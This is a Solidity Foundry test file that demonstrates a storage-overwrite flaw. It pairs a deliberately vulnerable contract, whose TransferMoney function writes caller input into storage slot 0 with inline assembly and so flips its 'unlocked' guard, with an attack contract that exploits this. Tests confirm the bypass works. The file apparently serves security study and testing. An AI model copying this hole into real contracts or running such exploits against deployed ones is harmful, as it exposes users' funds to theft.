pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract
contract PaySupplierVuln {
    // State variable stored in slot 0
    bool public unlocked = false;

    // The TransferMoney function that uses inline assembly to overwrite slot 0
    function TransferMoney(bytes32 _name) public {
        assembly {
            sstore(0, _name) // Overwrites slot 0, affecting 'unlocked'
        }
        require(unlocked, "unlocked is false");
    }

    // Allow the contract to receive Ether
    receive() external payable {}
}

// Attack contract that exploits the vulnerability
contract AttackPaySupplierVuln {
    PaySupplierVuln public target;

    constructor(PaySupplierVuln _target) {
        target = _target;
    }

    // The attack function sends a non-zero value to the vulnerable contract
    // causing its unlocked variable (slot 0) to become true.
    function attack() public {
        // bytes32(uint256(1)) is non-zero so that unlocked becomes true
        target.TransferMoney(bytes32(uint256(1)));
    }
}


// Forge Foundry test contract
contract TestUninitializedStorage is Test {
    PaySupplierVuln public vuln;
    AttackPaySupplierVuln public attacker;

    // Set up the vulnerable contract before each test
    function setUp() public {
        vuln = new PaySupplierVuln();
    }

    // Test that calling TransferMoney with a zero value fails, because unlocked remains false
    function testTransferMoneyRevertsWithZero() public {
        // expect the revert with the correct error message
        vm.expectRevert("unlocked is false");
        // Passing zero value, which will set unlocked to false in slot 0
        vuln.TransferMoney(bytes32(0));
    }

    // Test that the exploit via AttackPaySupplierVuln makes unlocked true and bypasses the require
    function testAttackExploit() public {
        // Initially, unlocked should be false
        bool initUnlocked = vuln.unlocked();
        assertEq(initUnlocked, false, "unlocked should initially be false");

        // Deploy the attacker contract with the address of the vulnerable contract
        attacker = new AttackPaySupplierVuln(vuln);

        // Execute the attack, which calls TransferMoney with a non-zero value
        // This should override the storage at slot 0 and set unlocked to true
        attacker.attack();

        // After the attack, unlocked should be true
        bool postAttackUnlocked = vuln.unlocked();
        assertEq(postAttackUnlocked, true, "unlocked should be true after the attack");
    }
}
